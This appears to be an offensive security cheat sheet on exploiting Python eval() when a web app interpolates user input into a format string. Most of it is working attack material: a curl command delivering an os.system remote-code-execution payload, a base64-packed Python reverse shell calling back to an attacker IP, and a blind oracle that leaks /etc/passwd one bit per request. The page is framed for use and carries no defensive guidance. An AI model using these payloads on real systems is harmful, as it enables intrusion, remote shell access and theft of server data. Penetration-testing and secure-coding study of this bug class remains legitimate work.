# Python `eval()` via Format-String Interpolation

## When this applies

- Server-side Python (Flask / FastAPI / Django view) inserts user-controlled data into a *format string* and then evaluates the result, e.g.:

  ```python
  if eval('%s > 1' % request.json['abv']):
  ```

  The intent is "is this number greater than 1" — but `'%s' % data` produces *Python source code*, not a numeric literal.

- Common in apps that try to "validate" a numeric range without actually parsing the number first.

- Even AST-restricted "expression" sandboxes are bypassed: `__import__("os").system(...)` is a single expression and runs unconditionally.

## Detection

- Send `'1'` / `'0.5'` / `'100'` first to confirm the param is interpolated raw rather than json-cast to float.
- Send `'1' if 1 else 1` — if the response branches differently from `'1'`, the value is being `eval`'d, not parsed.
- Send `(1)` then `(1,2)` — tuples vs ints are comparable in Py2 and raise `TypeError` in Py3, so a Py3 app will 500 on a tuple ("unhandled exception" is a strong signal).

## Exploit

```bash
# Side-effect-only RCE (response code immaterial — just trigger):
curl -k -H 'X-Auth: <TOKEN>' -X POST <ENDPOINT> \
     -H 'Content-Type: application/json' \
     -d '{"abv": "__import__(\"os\").system(\"id\")", "name":"x","brewer":"x","style":"x"}'
```

`os.system(...)` returns an int (exit code), so `'<int> > 1'` evaluates and the branch resolves cleanly. `os.popen(...).read()` returns a string; `'<str> > 1'` raises in Py3 and produces a 500. Either way the side effect already fired before the comparison.

## Blind eval — exfil channel

When the response only echoes "ABV must be < 1.0" or a generic 500, the eval still ran. Use a **pure-Python reverse shell** as the side effect — it's portable across Alpine / minimal containers that lack `nc` / `bash` / `curl`:

```python
# Base64-pack this; eval payload becomes:
#   __import__("os").system("python -c \"import base64,os;exec(base64.b64decode('<B64>').decode())\" &")

import socket, os, pty
s = socket.socket()
s.connect(("<ATTACKER_IP>", <PORT>))
[os.dup2(s.fileno(), f) for f in (0, 1, 2)]
pty.spawn("sh")
```

Once a shell is up, drive DB queries / file reads from there — the eval primitive is a one-liner stepping stone, not a long-term shell.

## In-band data extraction (no outbound)

If egress is firewalled, encode return values into the response code/timing:

```python
# Boolean oracle — exfils one bit per request:
__import__("re").match("^a", open("/etc/passwd").read()) is not None and 999 or 0
# 999 → response says "ABV must be < 1.0" (eval=True)
# 0   → response 500s (create_brew fails on string '0')
```

Combine with a binary-search over each character; slow but reliable.

## Anti-Patterns

- Reaching for AST-walker bypasses (`builtins`, `mro()` chains) when a plain `__import__("os").system(...)` is a single-expression literal that already works. The format-string sink doesn't restrict imports.
- Spending time on `eval` sandbox-escape tricks meant for restricted-eval contexts (`__builtins__ = None` style) — format-string sinks aren't sandboxed; they're just naïvely calling `eval` on attacker-formatted source.

## Cross-references

- OS-level command injection sinks (`os.system`, `subprocess.Popen(shell=True)`): [../../os-command-injection-cheat-sheet.md](../../os-command-injection-cheat-sheet.md).
- SSTI engines that ultimately also reach `eval`-style sinks: [../../ssti-cheat-sheet.md](../../ssti-cheat-sheet.md).
- Driving an interactive password prompt (e.g., SSH OTP) without `sshpass`/`expect` once you have a foothold shell: [`../../../../system/reference/scenarios/linux-privesc/vault-otp-ssh-role.md`](../../../../system/reference/scenarios/linux-privesc/vault-otp-ssh-role.md).
